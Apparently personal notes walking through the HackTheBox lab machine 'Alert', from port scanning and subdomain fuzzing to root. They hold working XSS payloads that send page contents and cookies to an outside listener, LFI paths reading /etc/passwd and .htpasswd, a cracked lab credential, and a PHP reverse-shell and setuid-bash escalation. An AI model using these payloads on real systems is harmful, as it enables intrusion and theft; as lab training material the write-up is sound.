> nmap -p- 10.129.166.43 --min-rate 5000

![[Pasted image 20250620084351.png]]

> nmap -p 22,80,12227 -sC -sV 10.129.166.43 -oN nmap_alert

![[Pasted image 20250620084519.png]]

- ubuntu linux
- apache 2.4.41
- website at alert.htb

## alert.htb website

![[Pasted image 20250620084804.png | website screenshot]]
## ffuf scan in the bg

### subdomain scan

> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://alert.htb -H "Host: FUZZ.alert.htb" -fw 20

- -fw 20: filter those have word-count:20

```
statistics
```

##### add 'statistics' to /etc/hosts file

```
#HTB
10.129.166.43    alert.htb  statistics.alert.htb
```

### directory scan

>  ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://alert.htb/FUZZ

![[Pasted image 20250620085254.png]]


## go to statistics.alert.htb

![[Pasted image 20250620085507.png]]

fount nothing

## go to alert.htb

- upload xss.md

**we get XSS!**

![[Pasted image 20250620085725.png |xss when uploaded xss.md to alert.htb]]

## in alert.htb contact page

put this

```
<script>fetch'(http://10.10.14.70/?cookie='+document.cookie);</script>
```

![[Pasted image 20250620090101.png]]

##### check response in python server

> python -m http.server 80

![[Pasted image 20250620090142.png|response in our server, meaning the fetching worked from CONTACT page!]]
## try again with neo.md

![[Pasted image 20250620090410.png|source code for neo.md]]
```js
<script>
fetch('http://alert.htb')
.then(response=>response.txt())
.then(data => {
fetch("http://10.10.14.70/?data="+btoa(data));;
})
</script>
```
- btoa:base64-to-something?

run the python server again
> python -m http.server 80

![[Pasted image 20250620090730.png|got data from fetch]]

## base64 decode the data

pipe the data then base 64 decode it

## fetch from messages.php

neo.md
```js
<script>
fetch('http://alert.htb/messages.php')
.then(response=>response.txt())
.then(data => {
fetch("http://10.10.14.70/?data="+btoa(data));;
})
</script>
```

response from python server

![[Pasted image 20250620091104.png]]

### put the vulnerable md file link into the contact page's message

![[Pasted image 20250620091227.png]]

```js
<script src="http://alert.htb/visualizer.php?link_share=67f15a9a8q63.5378987.md"></script>
```

get new response

![[Pasted image 20250620091407.png| get base64 encoded response]]
base64 decode the message
![[Pasted image 20250620091438.png]]

we get new url
- add this to our fetch script

### fetch again with new url file link

neo.md
```js
<script>
fetch('http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt')
.then(response=>response.txt())
.then(data => {
fetch("http://10.10.14.70/?data="+btoa(data));;
})
</script>
```

after uploading this neo.md we get link to it

##### xss using the new file link

```js
<script src="http://alert.htb/visualizer.php?link_share=67f15a9a8q63.5378987.md"></script>
```

we get data back, base64 encoded!
![[Pasted image 20250620091940.png]]

### look for LFI, etc/passwd

neo.md
```js
<script>
fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
.then(response=>response.txt())
.then(data => {
fetch("http://10.10.14.70/?data="+btoa(data));;
})
</script>
```

get file link

put it in
```
<script src=""></script>
```

we get response

![[Pasted image 20250620093653.png]]
base64 decode it

![[Pasted image 20250620093717.png|result for etc/passwd]]


now we **know LFI is working**

### .htpasswd, get albert's credentials

neo1.md
```js
<script>
fetch('http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd')
.then(response=>response.txt())
.then(data => {
fetch("http://10.10.14.70/?data="+btoa(data));;
})
</script>
```

got albert's credential

![[Pasted image 20250620094108.png | albert creds]]

##### hashcat the creds

we get back

`albert:machesterunited`

# Privilege Escalation

## go the statistics.alert.htb with albert's creds & SSH

> ssh albert@alert.htb

### test for sudo -l

> sudo -l

```
Sorry, user albert may not run sudo on alert
```

### ps aux

> ps aux

we see what is run by roots

`/usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor`

> ps -ef | grep 8080

![[Pasted image 20250620101944.png]]

> netstat -tuln

![[Pasted image 20250620101336.png|wesbites running localy]]
#### test if we can reach local website

> curl http://127.0.0.1:8080

```
we get huge html back
```

### cd to /opt/website-monitor

check for writable files

> find . -writable

![[Pasted image 20250620102045.png | writable is ./config ./monitors folders]]
#### go to .config folder

create **shell php** script inside

listen using netcat on 9001
> nc -lvnp 9001

shell.php to get root using netcat listener
```php
<?php 
system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'");
?>
```

or
shell2.php to escalate your privilege directly
```php
<?php exec("chmod +s /bin/bash"); ?>
```

##### run the shell.php
 
1. 
> curl localhost:8080/config/shell.php

2.  
> curl http://127.0.0.1:8080/config/shell.php

**We get ROOT from NetCat Listener!**

